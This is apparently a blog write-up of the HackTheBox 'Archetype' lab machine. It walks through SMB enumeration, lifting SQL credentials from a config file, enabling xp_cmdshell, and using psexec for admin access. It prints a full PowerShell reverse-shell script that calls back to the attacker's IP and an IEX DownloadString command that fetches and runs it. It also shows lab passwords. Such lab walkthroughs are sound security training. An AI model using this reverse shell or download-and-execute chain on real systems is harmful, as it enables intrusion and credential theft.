---
title: "HackTheBox Write-up&mdash;Archetype"
date: 2021-03-22
---

I am going to have a quick night of attempting the "Starting Point" machines in HackTheBox.  These machines I didn't see when I first started using HackTheBox, but they seem to be valuable in understanding the usual layout of these kinds of machines.  I think they are of a common author, too.  And I do believe this particular machine is made by the person who made HackTheBox.  So with all that in mind, here goes!

---

# The Short Version

1. Enumerate ports via `nmap -sC -sV 10.10.10.27`. Optionally add the archetype machine to your `/etc/hosts` file for a nicer way of referencing this machine.
2. Run `smbclient -N -L \\\\10.10.10.27\\` to list the directories in the samba storage. Notice `backups` is open access;
3. Run `smbclient -N \\\\10.10.10.27\\backups` to peek inside the backups directory. Notice the `prod.dtsConfig` file inside;
4. Get the `prod.dtsConfig` by running `get prod.dtsConfig` in the samba client;
5. In your own shell, now run `cat prod.dtsConfig | awk -F'User ID=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"` to get the username, and `cat prod.dtsConfig | awk -F'Password=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"` to get the password;
6. Ensure you have Impacket's tools: `git clone https://github.com/SecureAuthCorp/impacket`;
7. We can access the `mssql` server using Impacket's `mssqlclient` tool: `python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`. Notice here the use of the username from two steps ago. When prompted, enter the password obtained from two steps ago;
8.  Now that you are logged in as `sql_svc`, we can run the following series of SQL commands to access the command shell:
    ```sql
    sp_configure 'show advanced options', '1'
    RECONFIGURE
    sp_configure 'xp_cmdshell', '1'
    RECONFIGURE
    ```
9. We need to note down your `tun0` IP. On your computer, run: `ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'`;
10. We need to put the following into a `shell.ps1` file on your computer:
    ```powershell
    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
    ```
     Notice that we have your `tun0` IP, with some port number (here we have chosen `1234`) near the start of the file; 
11. On your computer, we need to set up an http server for later; run `sudo python3 -m http.server 80`. Ensure you run this in the same directory as your reverse powershell script from the previous step;
12. Also on your computer, we will need a netcat listener; run `nc -nvlp 1234` (or exchange `1234` with the port you chose two steps ago. Note that in the verbatim version, I used this along with `rlwrap` to make this step nicer);
13. Back in the SQL window, now run `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");`" in order to transfer the reverse powershell script to the SQL database;
14. Go back to you netcat listener window, and you will see that it has connected to the server! You can verify this by running `whoami`. You can now run more `\users\sql_svc\desktop\user.txt` to capture the user flag!;
15. This privilege escalation is simple: it only relies on the powershell history file, which requires no higher rights to acces. Simply run: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and you will see a username and a password;
16. Going back to your computer, we now need to log into the `administrator` user. We can do this using another one of Impacket's scripts: `psexec.py`: `python3 impacket/examples/psexec.py administrator@archetype`. Enter the password found in the previous step when prompted;
17. Now you are logged into the administrator, you can capture the root flat: `more \users\administrator\desktop\root.txt`, and you are finished!

# The Long (Verbatim) Version

We enumerate the ports:
```
$ bash common/nmap.sh archetype
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 22:16 NZDT
Nmap scan report for archetype (10.10.10.27)
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-03-22T09:16:33
|_Not valid after:  2051-03-22T09:16:33
|_ssl-date: 2021-03-22T09:38:16+00:00; +21m07s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h45m06s, deviation: 3h07m50s, median: 21m05s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-22T02:38:03-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-22T09:38:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.36 seconds
```

This is a good start.  As usual, we look for a web domain to gain a foothold.  There is a lot of information here, but we see an RPC server on port `135`, a `netbios-ssn` on port `139`, a `microsoft-ds` on port `445`, and an SQL server on port `1433`.  However, seeing that there is an SQL server, let's try to get some SQL tools ready.  I see we can install them [via these instructions](https://docs.microsoft.com/en-us/sql/linux/sql-server-linux-setup-tools?view=sql-server-ver15#ubuntu).  However, this installation is specifically for Ubuntu so it failed.

However, I did find [this](https://resources.infosecinstitute.com/topic/attacking-ms-sql-server-gain-system-access/) on the web, and keeping in mind my initial thoughts on HTB, this looks very convenient!

From the link, we see that ExploitDB has some things.  So, there are a lot of exploits, it seems.  We need to choose one...  We know that the `mssql` server version this machine is using is from 2017.

Let's quickly have a look at the [CLI for `mssql`](https://opensource.com/article/18/1/ms-sql-command-line-client) before we have a go at the metasploit results.  We need to first run:
```bash
$ pip install mssql-cli
$ echo 'PATH=$PATH:$HOME/.local/bin/' >> ~/.zshrc
$ source ~/.zshrc
```

However, this CLI keeps erroring regarding dependencies, so no good.  Let's have another look at those metasploit results.

I run
```
searchsploit -m 23649
```

At this point, I realise I have very little knowledge of how to use metasploit, so I found [this video](https://www.youtube.com/watch?v=8lR27r8Y_ik) which helped me understand.  So entering the `msfconsole` and we search for exploits:
```
msf6 > search type:exploit platform:windows microsoft sql
```

Recall that we are dealing with Microsoft SQL Server 2017, and only one of these has an Disclosure Date of later than that, so we choose that one:
```
msf6 > use exploit/windows/http/ssrs_navcorrector_viewstate
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/ssrs_navcorrector_viewstate) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows (x86)
   1   Windows (x64)
   2   Windows (cmd)


msf6 exploit(windows/http/ssrs_navcorrector_viewstate) > show info

       Name: SQL Server Reporting Services (SSRS) ViewState Deserialization
     Module: exploit/windows/http/ssrs_navcorrector_viewstate
   Platform: Windows
       Arch:
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2020-02-11

Provided by:
  Soroush Dalili
  Spencer McIntyre

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Windows (x86)
  1   Windows (x64)
  2   Windows (cmd)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DOMAIN     WORKSTATION      yes       The domain to use for Windows authentication
  PASSWORD                    yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /Reports         yes       The base path to the web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  USERNAME                    yes       Username to authenticate as
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  A vulnerability exists within Microsoft's SQL Server Reporting
  Services which can allow an attacker to craft an HTTP POST request
  with a serialized object to achieve remote code execution. The
  vulnerability is due to the fact that the serialized blob is not
  signed by the server.

References:
  https://cvedetails.com/cve/CVE-2020-0618/
  https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
```

Let's quickly digress.

---

After some searching online, we see that `microsoft-ds` is actually associated with samba!  We know of samba from our home server, and have `smbclient` installed.

We run
```bash
smbclient -N -L \\\\10.10.10.27\\
```

This enumerates the samba shares available:
```bash
$ smbclient -N -L \\\\10.10.10.27\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Let's have a look at what is in `ADMIN$`!:
```bash
$ smbclient -N \\\\10.10.10.27\\ADMIN$                               1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
```

It seems it is not accessible anonymously.  In fact, the only one anonymously accessible is `backups`, and here is what we find:
```bash
 smbclient -N \\\\10.10.10.27\\backups                                                                                                                           1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 21 01:20:57 2020
  ..                                  D        0  Tue Jan 21 01:20:57 2020
  prod.dtsConfig                     AR      609  Tue Jan 21 01:23:02 2020

                10328063 blocks of size 4096. 8260396 blocks available
smb: \>
```

Note that another command for `ls` is `dir` in samba client.

We run `get prod.dtsConfig` to get the file in the backup directory.  It looks like this:
```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

It looks like there is a password and username here!  We recall from Passage that we have Impacket's `mssqlclient.py` script, and we use it here:
```bash
$ git clone https://github.com/SecureAuthCorp/impacket;

$ python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

Now we are logged in as user `ARCHETYPE\sql_svc`!

Let's have a look at the help commands:
```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

This is curious; particularly the `xp_cmdshell` ones...  We need a way to change this SQL shell into an RCE.  Searching `xp_cmdshell`, I found [this](https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/) on the web to help us do this!  Running
```sql
-- this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
-- this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

Here is the output:
```
SQL> sp_configure 'show advanced options', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> sp_configure 'xp_cmdshell', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> xp_cmdshell "whoami"
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL

SQL>
```

Now we have a command shell!  We can then turn this into a nicer shell.  Our python command from Passage unfortunately does not work;
```
SQL> xp_cmdshell "python -c 'import pty; pty.spawn("/bin/bash")'"
[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near 'import'.
```

However, I searched online and found this, which will enumerate ports on the system (using powershell) so that we can get a reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
```

We need to change the IP address to your `tun0` one:
```bash
$ ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])';
10.10.14.34
```
And the port to the one you want to use (e.g., `1234`).

To host this reverse shell file. we need to set up a mini server.  We do this by, on our machine, running a python command (be sure to do this in the same directory as your powershell reverse shell file!):
```bash
$ sudo python3 -m http.server 80
[sudo] password for jakeireland:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we run a netcat listener on the port specified in our reverse shell file above:
```bash
$ nc -nvlp 1234
listening on [any] 1234 ...
```

Now we need to upload our reverse shell file to the SQL database.  We found [this](https://github.com/frizb/Windows-Privilege-Escalation#uploading-files-with-powershell) online for how to upload files, so we run the following:
```
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");"
```
We run this and see that our netcat listener picks up something!:
```
$ sudo rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49710
```

In that window, we can now run
```
$ sudo rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49683
whoami
archetype\sql_svc
more \users\sql_svc\desktop\user.txt
3e7b************************21a3
```

Now we have the user flag!  But as far as I can tell, `archetype\sql_svc` is an ordinary user.  We need to escalate privileges.  I follow a good article [here](https://github.com/frizb/Windows-Privilege-Escalation) on privilege escalation in Windows.  Here is some basic data about the user and the system:
```powershell
whoami
archetype\sql_svc
net user

User accounts for \\ARCHETYPE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
sql_svc                  WDAGUtilityAccount
The command completed successfully.

systeminfo

Host Name:                 ARCHETYPE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA442
Original Install Date:     1/19/2020, 11:39:36 PM
System Boot Time:          3/24/2021, 8:19:01 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 983 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,328 MB
Virtual Memory: In Use:    1,103 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB4532947
                           [02]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.27
                                 [02]: fe80::cc9b:ff1e:4d8a:e751
                                 [03]: dead:beef::cc9b:ff1e:4d8a:e751
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
netconfig Workstation
net config Workstation
Computer name                        \\ARCHETYPE
Full Computer name                   Archetype
User name                            sql_svc

Workstation active on
        NetBT_Tcpip_{F9786909-146A-4450-84CE-B06994DB4499} (005056B90510)

Software version                     Windows Server 2019 Standard

Workstation domain                   WORKGROUP
Logon domain                         ARCHETYPE

COM Open Timeout (sec)               0
COM Send Count (byte)                16
COM Send Timeout (msec)              250
The command completed successfully.

net users

User accounts for \\ARCHETYPE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
sql_svc                  WDAGUtilityAccount
The command completed successfully.
```

But in fact, I found another excellent-looking article [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#powershell-history) describing some more privilege escalation.  I try running:
```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```
So it looks like there is a user called `administrator` with potentially a password there: `MEGACORP_4dm1in!!`...  Given this, it looks like `backups` has been mapped using the local admin credentials.

Let's try logging into the system again, using another one of Impacket's tools: `psexec.py`;
```bash
$ python3 git-workspace/impacket/examples/psexec.py administrator@archetype
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on archetype.....
[*] Found writable share ADMIN$
[*] Uploading file NxYETPZE.exe
[*] Opening SVCManager on archetype.....
[*] Creating service bzkq on archetype.....
[*] Starting service bzkq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

And it looks like we are now accessing the root user!!

We go to their desktop and find the root flag.  Hurrah!
```powershell
C:\Windows\system32>more \users\administrator\desktop\root.txt
b91c************************8528
```

<br>

---

<br>

# Notes

I must admit, I know this is supposed to be the easiest one, made even by the person who created HTB (I believe), but without an HTTP server I must admit I struggled a bit, as I had only experience with HTTP servers.  And naturally, it's always a bit of a struggle to escalate privileges, as there are some pretty niche footholds to do so out there...  And a lot.  Either way, this was a fun experience.
